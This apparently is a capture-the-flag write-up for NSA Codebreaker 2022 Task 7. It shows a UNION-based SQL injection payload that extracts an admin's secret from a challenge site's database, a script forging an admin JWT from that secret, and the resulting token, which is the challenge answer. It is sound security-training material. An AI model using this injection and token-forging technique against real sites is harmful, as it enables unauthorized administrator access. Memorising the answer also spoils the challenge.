---
title: "NSACodebreaker2022 - Task7"
topic: "general"
tags: ["web-hacking", "sql-injection"]
prev: "http://localhost:1313/posts/nsacodebreaker2022-task6"
next: "http://localhost:1313/posts/nsacodebreaker2022-task8"
date: 2022-12-20T11:37:37-05:06
draft: true
---

# Table of Contents
1. [Task A1](http://localhost:1313/posts/nsacodebreaker2022-taska1)
2. [Task A2](http://localhost:1313/posts/nsacodebreaker2022-taska2)
3. [Task B1](http://localhost:1313/posts/nsacodebreaker2022-taskb1/)
4. [Task B2](http://localhost:1313/posts/nsacodebreaker2022-taskb2/)
5. [Task 5](http://localhost:1313/posts/nsacodebreaker2022-task5/)
6. [Task 6](http://localhost:1313/posts/nsacodebreaker2022-task6/)
7. [Task 7](#task-7)
	- [Solution](#solution)
8. [Task 8](http://localhost:1313/posts/nsacodebreaker2022-task8/)
9. [Task 9](http://localhost:1313/posts/nsacodebreaker2022-task9/)

## Task 7

- - -
###### With access to the site, you can access most of the functionality. But there's still that admin area that's locked off.

###### Generate a new token value which will allow you to access the ransomware site as an administrator.
- - -

### Solution

Having access to the web server can only take us so far without having unlimited access to all the site has to offer. However, the credentials we uncovered only provide us user access. We will need to somehow generate an admin JWT token, which unfortunately isn't as easy as changing a plain text role value from `user` to `admin`. 

Luckily, we have the source code - so we can see what differentiates an admin from a user. 

The `server.py` script holds the web framework logic that checks if a user is admin before allowing access to the requested area of the web server. The function used to check is `util.check_admin()`. The logic looks like the following:

```python
def is_admin():
	""" Is the logged-in user an admin? """	
	uid = get_uid()
	with userdb() as con:
		query = "SELECT isAdmin FROM Accounts WHERE uid = ?"
		row = con.execute(query, (uid,)).fetchone()
		if row is None:
			return False
		return row[0] == 1 

def check_admin(f):
	""" Call f only if user is an admin """
	if not is_admin():
		return render_template("admininvalid.html")
	return f()
```

It looks like there is a query to a database that holds the information as to whether the `uid` is associated to an `admin` account. We also know that in order to generate a valid JWT token for an admin account - we will need this account's `secret` value as seen by the `generate_token` function:

```python
row = con.execute("SELECT uid, secret from Accounts WHERE userName = ?", (userName,)).fetchone()
```

This means if we want to get any of this information we will need to somehow compromise the database which holds the information, and what better way to do that than with sql injection?

Looking around the source code, most of the sql queries are safe and sound but one. Within the `userinfo()` function in `server.py` there is a query to look up information on various users.

```python
infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query
```

And instead of using a parameterized query, denoted by the `?` character; instead this query passing in our user input via a `string` without any input sanitization! This is very dangerous and indeed vulnerable to sql injection, but very lucky for us. 

Playing with the website, I was able to come across the name of an active admin member: `ClassyMenorah`. Since we know the username of this admin, we can craft a special payload to extract the `uid` and `secret`. Unfortunately, however, this `userinfo()` function casts all of our returned strings to integers! This won't work if we want the secret in an ascii readable format!

Luckily, sql provides many functions such as `HEX`, `substr`, `CAST`, and `AS` keywords that can help us out in the process of extracting this information. Piecing together several injection commands like the following:

```
' UNION SELECT uid,LENGTH(secret),CAST(HEX(substr(secret, 20, 22)) AS FLOAT), CAST(HEX(substr(secret, 22, 22)) AS int) FROM Accounts WHERE userName='ClassyMenorah'; -- 
```

Can gives us 90% of the secret key in hex format that we can convert to ascii on our own. However, there are a few characters that gives us way more information that we need. 

In order for me to better test what was going on - I wrote my own script to test what was happening in the backend. Playing with the values I was receiving and their hex form quite a bit. 

* 9223372036854775807 casted as an integer 
* 59346176483058553716736 cased as a float.

Some of you may recognize what is happening here, but it took me longer than I'd like to admit to figure out what was happening. `9223372036854775807` is the maximum signed integer value that can be stored. However - `59346176483058553716736` was not the max float value. Looking closer - I was able to see overlap from previous hex values I was looking at, which completed the process of extracting the admin secret. 

```
6743345A637A6533364D6F304739685938394D59346176483058553231336D46
                           or
             gC4Zcze36Mo0G9hY89MY4avH0XU213mF
```

Adjusting my JWT token generator script from task 6 to change the `uid` and `secret`

```python
import codecs
hex_str = "6743345A637A6533364D6F304739685938394D59346176483058553231336D46"
hex_str = codecs.decode(hex_str, "hex").decode('utf-8')

token = generate_token("45619", "gC4Zcze36Mo0G9hY89MY4avH0XU213mF")
print(f"==== GENERATED TOKEN ====\n\n {token} \n\n")
validate_token(token)
```

This outputs a valid JWT admin token:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjExNjg4MzYsImV4cCI6MTY2Mzc2MDgzNiwidWlkIjoiNDU2MTkiLCJzZWMiOiJnQzRaY3plMzZNbzBHOWhZODlNWTRhdkgwWFUyMTNtRiJ9.i7JBnO0WIAbX4uwjKfkQb0urmh5xl5CoIqZfexfo8bA


{'iat': 1661168836, 'exp': 1663760836, 'uid': '45619', 'sec': 'gC4Zcze36Mo0G9hY89MY4avH0XU213mF'}
```

The correct answer:

The cookie you generate at the time, which for my case was:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjExNjg4MzYsImV4cCI6MTY2Mzc2MDgzNiwidWlkIjoiNDU2MTkiLCJzZWMiOiJnQzRaY3plMzZNbzBHOWhZODlNWTRhdkgwWFUyMTNtRiJ9.i7JBnO0WIAbX4uwjKfkQb0urmh5xl5CoIqZfexfo8bA`

![Task 7 Badge](/posts/badge7.png "Task 7 Badge")

- - -